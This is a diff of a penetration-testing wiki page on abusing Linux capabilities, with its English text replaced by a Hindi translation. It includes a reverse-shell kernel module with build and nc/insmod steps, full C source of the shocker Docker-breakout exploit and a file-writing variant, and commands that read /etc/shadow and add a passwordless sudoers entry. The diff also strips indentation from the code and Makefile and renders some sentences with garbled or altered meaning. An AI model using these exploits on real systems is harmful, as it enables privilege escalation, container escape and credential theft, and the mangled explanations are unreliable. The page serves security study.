 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-
-By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.\
-In order to abuse this, lets create a fake **lib/modules** folder:
-
+डिफ़ॉल्ट रूप से, **`modprobe`** कमांड **`/lib/modules/$(uname -r)`** नामक निर्देशिका में डिपेंडेंसी सूची और मैप फ़ाइल की जांच करता है।\
+इसे दुरुपयोग करने के लिए, चलो एक नकली **lib/modules** फ़ोल्डर बनाते हैं:
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-
-Then **compile the kernel module you can find 2 examples below and copy** it to this folder:
-
+तो **कर्नल मॉड्यूल को कंपाइल करें, नीचे 2 उदाहरण दिए गए हैं और** इस फ़ोल्डर में कॉपी करें:
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-
-Finally, execute the needed python code to load this kernel module:
-
+अंत में, इस कर्नल मॉड्यूल को लोड करने के लिए आवश्यक पायथन कोड को निष्पादित करें:
 ```python
 import kmod
 km = kmod.Kmod()
 km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
+**उदाहरण 2 बाइनरी के साथ**
 
-**Example 2 with binary**
-
-In the following example the binary **`kmod`** has this capability.
-
+निम्नलिखित उदाहरण में बाइनरी **`kmod`** के पास यह क्षमता है।
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
+जिसका मतलब है कि कर्नल मॉड्यूल डालने के लिए कमांड **`insmod`** का उपयोग किया जा सकता है। इस विशेषांक का दुरुपयोग करके एक **रिवर्स शैल** प्राप्त करने के लिए नीचे दिए गए उदाहरण का पालन करें।
 
-Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.
+**पर्यावरण के साथ उदाहरण (Docker ब्रेकआउट)**
 
-**Example with environment (Docker breakout)**
-
-You can check the enabled capabilities inside the docker container using:
-
+आप डॉकर कंटेनर में सक्षम क्षमताओं की जांच करने के लिए निम्नलिखित का उपयोग कर सकते हैं:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
 Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 Securebits: 00/0x0/1'b0
- secure-noroot: no (unlocked)
- secure-no-suid-fixup: no (unlocked)
- secure-keep-caps: no (unlocked)
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
 uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
+पिछले आउटपुट में आप देख सकते हैं कि **SYS\_MODULE** क्षमता सक्षम है।
 
-Inside the previous output you can see that the **SYS\_MODULE** capability is enabled.
-
-**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:
+**करेनल मॉड्यूल** बनाएं जो एक रिवर्स शेल चलाएगा और इसे **कंपाइल** करने के लिए **Makefile** बनाएं:
 
 {% code title="reverse-shell.c" %}
 ```c
@@ -765,45 +1206,40 @@ static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/
 
 // call_usermodehelper function is used to create user mode processes from kernel space
 static int __init reverse_shell_init(void) {
-    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 static void __exit reverse_shell_exit(void) {
-    printk(KERN_INFO "Exiting\n");
+printk(KERN_INFO "Exiting\n");
 }
 
 module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
-{% endcode %}
-
 {% code title="Makefile" %}
 ```bash
 obj-m +=reverse-shell.o
 
 all:
-    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
 clean:
-    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 {% endcode %}
 
 {% hint style="warning" %}
-The blank char before each make word in the Makefile **must be a tab, not spaces**!
+Makefile में हर शब्द के पहले रिक्त चरित्र **टैब होना चाहिए, न कि स्पेसेस**!
 {% endhint %}
 
-Execute `make` to compile it.
-
+इसे कंपाइल करने के लिए `make` को निष्पादित करें।
 ```
 ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.
 
 sudo apt update
 sudo apt full-upgrade
 ```
-
-Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:
-
+अंत में, एक शैल में `nc` शुरू करें और दूसरे शैल से **मॉड्यूल लोड** करें और आप nc प्रक्रिया में शैल को कैप्चर करेंगे:
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -811,67 +1247,57 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
+**इस तकनीक का कोड "Abusing SYS\_MODULE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
-**The code of this technique was copied from the laboratory of "Abusing SYS\_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
-
-Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
+इस तकनीक का एक और उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) में दिया गया है
 
 ## CAP\_DAC\_READ\_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`. Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at(2)` to gain access to any file, even files outside their mount namespace. The handle passed into `open_by_handle_at(2)` is intended to be an opaque identifier retrieved using `name_to_handle_at(2)`. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit.\
-**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) प्रक्रिया को **फ़ाइल पढ़ने, और निर्देशिका पढ़ने और निर्देशिका को पढ़ने और निष्पादन करने की अनुमति** देता है। जबकि इसे फ़ाइलों को खोजने या पढ़ने के लिए उपयोग करने के लिए डिज़ाइन किया गया था, यह प्रक्रिया को `open_by_handle_at(2)` को आह्वान करने की अनुमति भी देता है। किसी भी प्रक्रिया के पास `CAP_DAC_READ_SEARCH` क्षमता होने पर वह `open_by_handle_at(2)` का उपयोग करके किसी भी फ़ाइल तक पहुंच प्राप्त कर सकती है, यहां तक कि उनके माउंट नेमस्पेस के बाहर की फ़ाइलें भी। `open_by_handle_at(2)` में पारित हैंडल को `name_to_handle_at(2)` का उपयोग करके प्राप्त किया जाना चाहिए। हालांकि, यह हैंडल गोपनीय और छेड़छाड़ के योग्य जानकारी, जैसे इनोड नंबर, को शामिल करता है। यह Docker कंटेनर में सबसे पहले Sebastian Krahmer द्वारा [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) अपशब्द के द्वारा एक मुद्दा साबित हुआ।\
+**इसका मतलब है कि आप फ़ाइल पढ़ने की अनुमति जांच और निर्देशिका पढ़ने / निष्पादन की अनुमति जांच को छोड़कर जा सकते हैं।**
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-The binary will be able to read any file. So, if a file like tar has this capability it will be able to read the shadow file:
-
+बाइनरी किसी भी फ़ाइल को पढ़ सकेगा। इसलिए, यदि एक फ़ाइल जैसे tar के पास इस क्षमता होती है तो यह shadow फ़ाइल को पढ़ सकेगा:
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
 cd /tmp
 tar -cxf shadow.tar.gz
 ```
+**बाइनरी 2 के साथ उदाहरण**
 
-**Example with binary2**
-
-In this case lets suppose that **`python`** binary has this capability. In order to list root files you could do:
-
+इस मामले में मान लें कि **`python`** बाइनरी के पास यह क्षमता है। रूट फ़ाइलों की सूची देखने के लिए आप यह कर सकते हैं:
 ```python
 import os
 for r, d, f in os.walk('/root'):
-    for filename in f:
-        print(filename)
+for filename in f:
+print(filename)
 ```
-
-And in order to read a file you could do:
-
+और फ़ाइल को पढ़ने के लिए आप कर सकते हैं:
 ```python
 print(open("/etc/shadow", "r").read())
 ```
+**पर्यावरण में उदाहरण (Docker ब्रेकआउट)**
 
-**Example in Environment (Docker breakout)**
-
-You can check the enabled capabilities inside the docker container using:
-
+आप निम्नलिखित कमांड का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
 Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 Securebits: 00/0x0/1'b0
- secure-noroot: no (unlocked)
- secure-no-suid-fixup: no (unlocked)
- secure-keep-caps: no (unlocked)
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
 uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
+पिछले आउटपुट में आप देख सकते हैं कि **DAC\_READ\_SEARCH** क्षमता सक्षम है। इसके परिणामस्वरूप, कंटेनर **प्रक्रियाओं को डीबग कर सकता है**।
 
-Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.
+आप यहां जान सकते हैं कि निम्नलिखित उत्पादन कैसे काम करता है: [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) लेकिन संक्षेप में कहें तो **CAP\_DAC\_READ\_SEARCH** हमें अनुमति के बिना फ़ाइल सिस्टम को चलाने की अनुमति नहीं देता ही है, बल्कि यह विशेष रूप से _**open\_by\_handle\_at(2)**_ और **हमारी प्रक्रिया को अन्य प्रक्रियाओं द्वारा खोली गई संवेदनशील फ़ाइलों की अनुमति देने वाली किसी भी जांच को हटा सकता है**।
 
-You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH** not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open\_by\_handle\_at(2)**_ and **could allow our process to sensitive files opened by other processes**.
-
-The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
-
+मूल उत्पादन जो इस अनुमति का दुरुपयोग करके होस्ट से फ़ाइलें पढ़ने का उपयोग करता है, यहां मिल सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), निम्नलिखित एक **संशोधित संस्करण है जो आपको पढ़ना चाहिए फ़ाइल को पहले तर्क के रूप में दर्ज करने और इसे एक फ़ाइल में डंप करने की अनुमति देता है**।
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -888,203 +1314,195 @@ The original exploit that abuse this permissions to read files from the host can
 // ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir
 
 struct my_file_handle {
-    unsigned int handle_bytes;
-    int handle_type;
-    unsigned char f_handle[8];
+unsigned int handle_bytes;
+int handle_type;
+unsigned char f_handle[8];
 };
 
 void die(const char *msg)
 {
-    perror(msg);
-    exit(errno);
+perror(msg);
+exit(errno);
 }
 
 void dump_handle(const struct my_file_handle *h)
 {
-    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
-    h->handle_type);
-    for (int i = 0; i < h->handle_bytes; ++i) {
-        fprintf(stderr,"0x%02x", h->f_handle[i]);
-        if ((i + 1) % 20 == 0)
-        fprintf(stderr,"\n");
-        if (i < h->handle_bytes - 1)
-        fprintf(stderr,", ");
-    }
-    fprintf(stderr,"};\n");
+fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
+h->handle_type);
+for (int i = 0; i < h->handle_bytes; ++i) {
+fprintf(stderr,"0x%02x", h->f_handle[i]);
+if ((i + 1) % 20 == 0)
+fprintf(stderr,"\n");
+if (i < h->handle_bytes - 1)
+fprintf(stderr,", ");
+}
+fprintf(stderr,"};\n");
 }
 
 int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
 *oh)
 {
-    int fd;
-    uint32_t ino = 0;
-    struct my_file_handle outh = {
-    .handle_bytes = 8,
-    .handle_type = 1
-    };
-    DIR *dir = NULL;
-    struct dirent *de = NULL;
-    path = strchr(path, '/');
-    // recursion stops if path has been resolved
-    if (!path) {
-        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
-        oh->handle_type = 1;
-        oh->handle_bytes = 8;
-        return 1;
-    }
+int fd;
+uint32_t ino = 0;
+struct my_file_handle outh = {
+.handle_bytes = 8,
+.handle_type = 1
+};
+DIR *dir = NULL;
+struct dirent *de = NULL;
+path = strchr(path, '/');
+// recursion stops if path has been resolved
+if (!path) {
+memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
+oh->handle_type = 1;
+oh->handle_bytes = 8;
+return 1;
+}
 
-    ++path;
-    fprintf(stderr, "[*] Resolving '%s'\n", path);
-    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
-        die("[-] open_by_handle_at");
-    if ((dir = fdopendir(fd)) == NULL)
-        die("[-] fdopendir");
-    for (;;) {
-        de = readdir(dir);
-        if (!de)
-        break;
-        fprintf(stderr, "[*] Found %s\n", de->d_name);
-        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
-            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
-            ino = de->d_ino;
-            break;
-        }
-    }
+++path;
+fprintf(stderr, "[*] Resolving '%s'\n", path);
+if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
+die("[-] open_by_handle_at");
+if ((dir = fdopendir(fd)) == NULL)
+die("[-] fdopendir");
+for (;;) {
+de = readdir(dir);
+if (!de)
+break;
+fprintf(stderr, "[*] Found %s\n", de->d_name);
+if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
+fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
+ino = de->d_ino;
+break;
+}
+}
 
-    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
-    if (de) {
-        for (uint32_t i = 0; i < 0xffffffff; ++i) {
-            outh.handle_bytes = 8;
-            outh.handle_type = 1;
-            memcpy(outh.f_handle, &ino, sizeof(ino));
-            memcpy(outh.f_handle + 4, &i, sizeof(i));
-            if ((i % (1<<20)) == 0)
-                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
-            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
-                closedir(dir);
-                close(fd);
-                dump_handle(&outh);
-                return find_handle(bfd, path, &outh, oh);
-            }
-        }
-    }
-    closedir(dir);
-    close(fd);
-    return 0;
+fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
+if (de) {
+for (uint32_t i = 0; i < 0xffffffff; ++i) {
+outh.handle_bytes = 8;
+outh.handle_type = 1;
+memcpy(outh.f_handle, &ino, sizeof(ino));
+memcpy(outh.f_handle + 4, &i, sizeof(i));
+if ((i % (1<<20)) == 0)
+fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
+if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
+closedir(dir);
+close(fd);
+dump_handle(&outh);
+return find_handle(bfd, path, &outh, oh);
+}
+}
+}
+closedir(dir);
+close(fd);
+return 0;
 }
 
 
 int main(int argc,char* argv[] )
 {
-    char buf[0x1000];
-    int fd1, fd2;
-    struct my_file_handle h;
-    struct my_file_handle root_h = {
-        .handle_bytes = 8,
-        .handle_type = 1,
-        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
-    };
-    
-    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
-    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
-    "[***] If you have pending sec consulting, I'll happily [***]\n"
-    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
-    
-    read(0, buf, 1);
-    
-    // get a FS reference from something mounted in from outside
-    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
-        die("[-] open");
-    
-    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
-        die("[-] Cannot find valid handle!");
-    
-    fprintf(stderr, "[!] Got a final handle!\n");
-    dump_handle(&h);
-    
-    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
-        die("[-] open_by_handle");
-    
-    memset(buf, 0, sizeof(buf));
-    if (read(fd2, buf, sizeof(buf) - 1) < 0)
-        die("[-] read");
-    
-    printf("Success!!\n");
-    
-    FILE *fptr;
-    fptr = fopen(argv[2], "w");
-    fprintf(fptr,"%s", buf);
-    fclose(fptr);
-    
-    close(fd2); close(fd1);
-    
-    return 0;
+char buf[0x1000];
+int fd1, fd2;
+struct my_file_handle h;
+struct my_file_handle root_h = {
+.handle_bytes = 8,
+.handle_type = 1,
+.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
+};
+
+fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
+"[***] The tea from the 90's kicks your sekurity again. [***]\n"
+"[***] If you have pending sec consulting, I'll happily [***]\n"
+"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
+
+read(0, buf, 1);
+
+// get a FS reference from something mounted in from outside
+if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
+die("[-] open");
+
+if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
+die("[-] Cannot find valid handle!");
+
+fprintf(stderr, "[!] Got a final handle!\n");
+dump_handle(&h);
+
+if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
+die("[-] open_by_handle");
+
+memset(buf, 0, sizeof(buf));
+if (read(fd2, buf, sizeof(buf) - 1) < 0)
+die("[-] read");
+
+printf("Success!!\n");
+
+FILE *fptr;
+fptr = fopen(argv[2], "w");
+fprintf(fptr,"%s", buf);
+fclose(fptr);
+
+close(fd2); close(fd1);
+
+return 0;
 }
 ```
-
 {% hint style="warning" %}
-I exploit needs to find a pointer to something mounted on the host. The original exploit used the file /.dockerinit and this modified version uses /etc/hostname. If the exploit isn't working maybe you need to set a different file. To find a file that is mounted in the host just execute mount command:
+मुझे किसी चीज़ के पॉइंटर को ढूंढ़ने के लिए एक एक्सप्लॉइट की आवश्यकता होती है जो होस्ट पर माउंट की गई हो। मूल एक्सप्लॉइट में फ़ाइल /.dockerinit का उपयोग किया गया था और इस संशोधित संस्करण में /etc/hostname का उपयोग किया जाता है। यदि एक्सप्लॉइट काम नहीं कर रहा है तो शायद आपको एक अलग फ़ाइल सेट करने की आवश्यकता हो सकती है। होस्ट में माउंट की गई फ़ाइल ढूंढ़ने के लिए बस माउंट कमांड को चलाएं:
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (407) (1).png>)
 
-**The code of this technique was copied from the laboratory of "Abusing DAC\_READ\_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**इस तकनीक का कोड "Abusing DAC\_READ\_SEARCH Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
 ​
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा इवेंट है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** की मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए हर विषय में एक उबलता हुआ मिलने का समय है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## CAP\_DAC\_OVERRIDE
 
-**This mean that you can bypass write permission checks on any file, so you can write any file.**
+**इसका मतलब है कि आप किसी भी फ़ाइल पर लिखने की अनुमति की जांच को छोड़ सकते हैं, इसलिए आप किसी भी फ़ाइल पर लिख सकते हैं।**
 
-There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+बहुत सारी फ़ाइलें हैं जिन पर आप **अधिकारों को उन्नत करने के लिए ओवरराइट कर सकते हैं,** [**यहां से आप विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
-**Example with binary**
+**बाइनरी के साथ उदाहरण**
 
-In this example vim has this capability, so you can modify any file like _passwd_, _sudoers_ or _shadow_:
-
+इस उदाहरण में vim के पास इस क्षमता है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी किसी भी फ़ाइल को संशोधित कर सकते हैं:
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/vim = cap_dac_override+ep
 
 vim /etc/sudoers #To overwrite it
 ```
+**दूसरा उदाहरण बाइनरी के साथ**
 
-**Example with binary 2**
-
-In this example **`python`** binary will have this capability. You could use python to override any file:
-
+इस उदाहरण में **`python`** बाइनरी को यह क्षमता होगी। आप पायथन का उपयोग करके किसी भी फ़ाइल को ओवरराइड कर सकते हैं:
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
+**उदाहरण वातावरण के साथ + CAP_DAC_READ_SEARCH (Docker ब्रेकआउट)**
 
-**Example with environment + CAP\_DAC\_READ\_SEARCH (Docker breakout)**
-
-You can check the enabled capabilities inside the docker container using:
-
+आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
 Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 Securebits: 00/0x0/1'b0
- secure-noroot: no (unlocked)
- secure-no-suid-fixup: no (unlocked)
- secure-keep-caps: no (unlocked)
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
 uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-
-First of all read the previous section that [**abuses DAC\_READ\_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap\_dac\_read\_search) of the host and **compile** the exploit.\
-Then, **compile the following version of the shocker exploit** that ill allow you to **write arbitrary files** inside the hosts filesystem:
-
+सबसे पहले, होस्ट की [**DAC\_READ\_SEARCH क्षमता का दुरुपयोग करके अनियमित फ़ाइलों को पढ़ने**](linux-capabilities.md#cap\_dac\_read\_search) के पिछले खंड को पढ़ें और एक्सप्लॉइट को **कंपाइल** करें।
+फिर, निम्नलिखित शॉकर एक्सप्लॉइट का निम्नलिखित संस्करण **कंपाइल करें**, जो आपको होस्ट की फ़ाइल सिस्टम में **अनियमित फ़ाइलें लिखने** की अनुमति देगा:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1098,182 +1516,172 @@ Then, **compile the following version of the shocker exploit** that ill allow yo
 #include <stdint.h>
 
 // gcc shocker_write.c -o shocker_write
-// ./shocker_write /etc/passwd passwd 
+// ./shocker_write /etc/passwd passwd
 
 struct my_file_handle {
-  unsigned int handle_bytes;
-  int handle_type;
-  unsigned char f_handle[8];
+unsigned int handle_bytes;
+int handle_type;
+unsigned char f_handle[8];
 };
 void die(const char * msg) {
-  perror(msg);
-  exit(errno);
+perror(msg);
+exit(errno);
 }
 void dump_handle(const struct my_file_handle * h) {
-  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
-    h -> handle_type);
-  for (int i = 0; i < h -> handle_bytes; ++i) {
-    fprintf(stderr, "0x%02x", h -> f_handle[i]);
-    if ((i + 1) % 20 == 0)
-      fprintf(stderr, "\n");
-    if (i < h -> handle_bytes - 1)
-      fprintf(stderr, ", ");
-  }
-  fprintf(stderr, "};\n");
-} 
+fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
+h -> handle_type);
+for (int i = 0; i < h -> handle_bytes; ++i) {
+fprintf(stderr, "0x%02x", h -> f_handle[i]);
+if ((i + 1) % 20 == 0)
+fprintf(stderr, "\n");
+if (i < h -> handle_bytes - 1)
+fprintf(stderr, ", ");
+}
+fprintf(stderr, "};\n");
+}
 int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
 {
-  int fd;
-  uint32_t ino = 0;
-  struct my_file_handle outh = {
-    .handle_bytes = 8,
-    .handle_type = 1
-  };
-  DIR * dir = NULL;
-  struct dirent * de = NULL;
-  path = strchr(path, '/');
-  // recursion stops if path has been resolved
-  if (!path) {
-    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
-    oh -> handle_type = 1;
-    oh -> handle_bytes = 8;
-    return 1;
-  }
-  ++path;
-  fprintf(stderr, "[*] Resolving '%s'\n", path);
-  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
-    die("[-] open_by_handle_at");
-  if ((dir = fdopendir(fd)) == NULL)
-    die("[-] fdopendir");
-  for (;;) {
-    de = readdir(dir);
-    if (!de)
-      break;
-    fprintf(stderr, "[*] Found %s\n", de -> d_name);
-    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
-      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
-      ino = de -> d_ino;
-      break;
-    }
-  }
-  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
-  if (de) {
-    for (uint32_t i = 0; i < 0xffffffff; ++i) {
-      outh.handle_bytes = 8;
-      outh.handle_type = 1;
-      memcpy(outh.f_handle, & ino, sizeof(ino));
-      memcpy(outh.f_handle + 4, & i, sizeof(i));
-      if ((i % (1 << 20)) == 0)
-        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
-      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
-        closedir(dir);
-        close(fd);
-        dump_handle( & outh);
-        return find_handle(bfd, path, & outh, oh);
-      }
-    }
-  }
-  closedir(dir);
-  close(fd);
-  return 0;
+int fd;
+uint32_t ino = 0;
+struct my_file_handle outh = {
+.handle_bytes = 8,
+.handle_type = 1
+};
+DIR * dir = NULL;
+struct dirent * de = NULL;
+path = strchr(path, '/');
+// recursion stops if path has been resolved
+if (!path) {
+memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
+oh -> handle_type = 1;
+oh -> handle_bytes = 8;
+return 1;
+}
+++path;
+fprintf(stderr, "[*] Resolving '%s'\n", path);
+if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
+die("[-] open_by_handle_at");
+if ((dir = fdopendir(fd)) == NULL)
+die("[-] fdopendir");
+for (;;) {
+de = readdir(dir);
+if (!de)
+break;
+fprintf(stderr, "[*] Found %s\n", de -> d_name);
+if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
+fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
+ino = de -> d_ino;
+break;
+}
+}
